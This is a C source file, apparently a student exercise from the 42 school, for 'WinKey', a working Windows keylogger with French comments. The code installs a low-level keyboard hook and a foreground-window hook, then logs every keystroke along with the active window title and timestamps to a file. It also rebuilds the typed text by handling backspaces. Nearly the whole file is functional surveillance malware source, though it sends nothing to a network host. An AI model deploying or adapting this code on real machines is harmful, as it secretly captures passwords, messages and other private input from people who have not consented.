/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: marvin <marvin@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/09/22 08:32:59 by marvin            #+#    #+#             */
/*   Updated: 2025/09/22 08:32:59 by marvin           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "winkey.h"

t_winkey g_winkey;

void getUtf8Char(int vkCode, char *buffer, size_t bufferSize) {
    // Gérer les caractères spéciaux explicitement
    switch (vkCode) {
        case VK_SPACE:
            strcpy(buffer, " ");
            return;
        case VK_RETURN:
            strcpy(buffer, "[ENTER]");
            return;
        case VK_TAB:
            strcpy(buffer, "[TAB]");
            return;
        case VK_BACK:
            strcpy(buffer, "[BACKSPACE]");
            return;
        case VK_DELETE:
            strcpy(buffer, "[DELETE]");
            return;
        case VK_ESCAPE:
            strcpy(buffer, "[ESC]");
            return;
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            strcpy(buffer, "[SHIFT]");
            return;
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            strcpy(buffer, "[CTRL]");
            return;
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            strcpy(buffer, "[ALT]");
            return;
        case VK_LWIN:
        case VK_RWIN:
            strcpy(buffer, "[WIN]");
            return;
        case VK_CAPITAL:
            strcpy(buffer, "[CAPS]");
            return;
        case VK_INSERT:
            strcpy(buffer, "[INSERT]");
            return;
        case VK_HOME:
            strcpy(buffer, "[HOME]");
            return;
        case VK_END:
            strcpy(buffer, "[END]");
            return;
        case VK_PRIOR:
            strcpy(buffer, "[PAGEUP]");
            return;
        case VK_NEXT:
            strcpy(buffer, "[PAGEDOWN]");
            return;
        case VK_UP:
            strcpy(buffer, "[UP]");
            return;
        case VK_DOWN:
            strcpy(buffer, "[DOWN]");
            return;
        case VK_LEFT:
            strcpy(buffer, "[LEFT]");
            return;
        case VK_RIGHT:
            strcpy(buffer, "[RIGHT]");
            return;
        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
            snprintf(buffer, bufferSize, "[F%d]", vkCode - VK_F1 + 1);
            return;
        case VK_NUMPAD0: case VK_NUMPAD1: case VK_NUMPAD2: case VK_NUMPAD3:
        case VK_NUMPAD4: case VK_NUMPAD5: case VK_NUMPAD6: case VK_NUMPAD7:
        case VK_NUMPAD8: case VK_NUMPAD9:
            snprintf(buffer, bufferSize, "[NUM%d]", vkCode - VK_NUMPAD0);
            return;
        case VK_MULTIPLY:
            strcpy(buffer, "[NUM*]");
            return;
        case VK_ADD:
            strcpy(buffer, "[NUM+]");
            return;
        case VK_SUBTRACT:
            strcpy(buffer, "[NUM-]");
            return;
        case VK_DECIMAL:
            strcpy(buffer, "[NUM.]");
            return;
        case VK_DIVIDE:
            strcpy(buffer, "[NUM/]");
            return;
        case VK_NUMLOCK:
            strcpy(buffer, "[NUMLOCK]");
            return;
        case VK_SCROLL:
            strcpy(buffer, "[SCROLLLOCK]");
            return;
        case VK_PAUSE:
            strcpy(buffer, "[PAUSE]");
            return;
        case VK_PRINT:
            strcpy(buffer, "[PRINTSCREEN]");
            return;
    }
    
    // Pour les caractères normaux, essayer la conversion Unicode
    UINT scanCode = MapVirtualKey((UINT)vkCode, MAPVK_VK_TO_VSC);
    BYTE keyState[256] = {0};
    WCHAR unicodeChar[2] = {0};
    int result = ToUnicode((UINT)vkCode, scanCode, keyState, unicodeChar, 2, 0);
    
    if (result > 0) {
        int utf8Length = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, buffer, (int)(bufferSize - 1), NULL, NULL);
        buffer[utf8Length] = '\0';
    } else {
        // Pour les touches inconnues
        snprintf(buffer, bufferSize, "[VK_%02X]", vkCode);
    }
}

void getCurrentWindowTitle(char *title, size_t size) {
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, title, (int)size);
    } else {
        strcpy(title, "Unknown Window");
    }
}

void flushLogFile(void) {
    if (g_winkey.keylog) {
        fflush(g_winkey.keylog);
    }
}

void logAccumulatedKeys(void) {
    if (g_winkey.keylog && strlen(g_winkey.key_buffer) > 0) {
        fprintf(g_winkey.keylog, "Time: %s, Window: %s, Keys: %s\n", 
                g_winkey.window_start_time, g_winkey.window_prev, g_winkey.key_buffer);
        flushLogFile();
        
        // Réinitialiser le buffer
        g_winkey.key_buffer[0] = '\0';
    }
}

void logWindowChange(void) {
    // Écrire les touches accumulées pour la fenêtre précédente
    logAccumulatedKeys();
    
    if (g_winkey.keylog) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        snprintf(g_winkey.window_start_time, sizeof(g_winkey.window_start_time), 
                "%04d-%02d-%02d %02d:%02d:%02d",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        
        fprintf(g_winkey.keylog, "\n--- Window Change at %s ---\n", g_winkey.window_start_time);
        fprintf(g_winkey.keylog, "Previous: %s\n", g_winkey.window_prev);
        fprintf(g_winkey.keylog, "Current: %s\n", g_winkey.window_title);
        fprintf(g_winkey.keylog, "--- End Window Change ---\n\n");
        flushLogFile();
    }
}

void sendKeyToLogFile(int vkCode) {
    if (g_winkey.keylog) {
        // Gérer le backspace spécialement
        if (vkCode == VK_BACK) {
            size_t current_len = strlen(g_winkey.key_buffer);
            if (current_len > 0) {
                // Trouver le début du dernier caractère/token
                char *last_char = g_winkey.key_buffer + current_len - 1;
                
                // Si le dernier caractère est ']', c'est probablement un token spécial
                if (*last_char == ']') {
                    // Chercher le '[' correspondant en remontant
                    while (last_char > g_winkey.key_buffer && *last_char != '[') {
                        last_char--;
                    }
                    if (*last_char == '[') {
                        *last_char = '\0'; // Supprimer tout le token
                    }
                } else {
                    // Caractère normal, supprimer juste le dernier caractère
                    g_winkey.key_buffer[current_len - 1] = '\0';
                }
            }
            return; // Ne pas ajouter [BACKSPACE] au buffer
        }
        
        char buffer[128];
        getUtf8Char(vkCode, buffer, sizeof(buffer));
        
        // Vérifier s'il y a assez de place dans le buffer
        size_t current_len = strlen(g_winkey.key_buffer);
        size_t new_key_len = strlen(buffer);
        
        if (current_len + new_key_len + 1 < KEY_BUFFER_SIZE) {
            strcat(g_winkey.key_buffer, buffer);
        }
        
        // Pas de flush immédiat - les touches seront écrites au changement de fenêtre
    }
}

VOID CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event,
                          HWND hwnd, LONG idObject, LONG idChild,
                          DWORD dwEventThread, DWORD dwmsEventTime) {
    // Marquer les paramètres non utilisés pour éviter les avertissements
    UNREFERENCED_PARAMETER(hWinEventHook);
    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(idObject);
    UNREFERENCED_PARAMETER(idChild);
    UNREFERENCED_PARAMETER(dwEventThread);
    UNREFERENCED_PARAMETER(dwmsEventTime);
    
    if (event == EVENT_SYSTEM_FOREGROUND) {
        // Sauvegarder l'ancien titre
        strcpy(g_winkey.window_prev, g_winkey.window_title);
        
        // Obtenir le nouveau titre
        getCurrentWindowTitle(g_winkey.window_title, WINDOW_TITLE_SIZE);
        
        // Logger le changement de fenêtre si c'est différent
        if (strcmp(g_winkey.window_prev, g_winkey.window_title) != 0) {
            logWindowChange();
        }
    }
}

LRESULT CALLBACK keyhook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            sendKeyToLogFile(kbd->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(int argc, char **argv) {
    MSG msg;
    
    // Marquer les paramètres non utilisés
    UNREFERENCED_PARAMETER(argc);
    UNREFERENCED_PARAMETER(argv);
    
    // Initialiser la structure
    memset(&g_winkey, 0, sizeof(t_winkey));
    
    // Ouvrir le fichier de log
    g_winkey.keylog = fopen(KEYLOG_FILE, "a");
    if (!g_winkey.keylog) {
        fprintf(stderr, "Erreur: Impossible d'ouvrir le fichier de log!\n");
        return 1;
    }
    
    // Obtenir le titre de la fenêtre actuelle
    getCurrentWindowTitle(g_winkey.window_title, WINDOW_TITLE_SIZE);
    strcpy(g_winkey.window_prev, "Initial");
    
    // Initialiser le timestamp de début pour la fenêtre initiale
    SYSTEMTIME st;
    GetLocalTime(&st);
    snprintf(g_winkey.window_start_time, sizeof(g_winkey.window_start_time), 
            "%04d-%02d-%02d %02d:%02d:%02d",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    
    // Logger le démarrage
    char timestamp[64];
    snprintf(timestamp, sizeof(timestamp), "%04d-%02d-%02d %02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    fprintf(g_winkey.keylog, "\n=== WinKey Started at %s ===\n", timestamp);
    fprintf(g_winkey.keylog, "Initial Window: %s\n\n", g_winkey.window_title);
    flushLogFile();
    
    // Installer le hook pour le clavier
    g_winkey.keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyhook_proc, GetModuleHandle(NULL), 0);
    if (!g_winkey.keyboard_hook) {
        fprintf(stderr, "Erreur: Impossible d'installer le hook clavier!\n");
        fclose(g_winkey.keylog);
        return 1;
    }
    
    // Installer le hook pour les changements de fenêtre
    g_winkey.window_hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
                                          NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
    if (!g_winkey.window_hook) {
        fprintf(stderr, "Erreur: Impossible d'installer le hook fenêtre!\n");
        UnhookWindowsHookEx(g_winkey.keyboard_hook);
        fclose(g_winkey.keylog);
        return 1;
    }

    printf("WinKey démarré. Appuyez sur Ctrl+C pour arrêter.\n");

    // Boucle de messages
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Nettoyage
    if (g_winkey.keyboard_hook) {
        UnhookWindowsHookEx(g_winkey.keyboard_hook);
    }
    if (g_winkey.window_hook) {
        UnhookWinEvent(g_winkey.window_hook);
    }
    if (g_winkey.keylog) {
        // Écrire les dernières touches accumulées avant de fermer
        logAccumulatedKeys();
        fprintf(g_winkey.keylog, "\n=== WinKey Stopped ===\n\n");
        fclose(g_winkey.keylog);
    }
    
    return 0;
}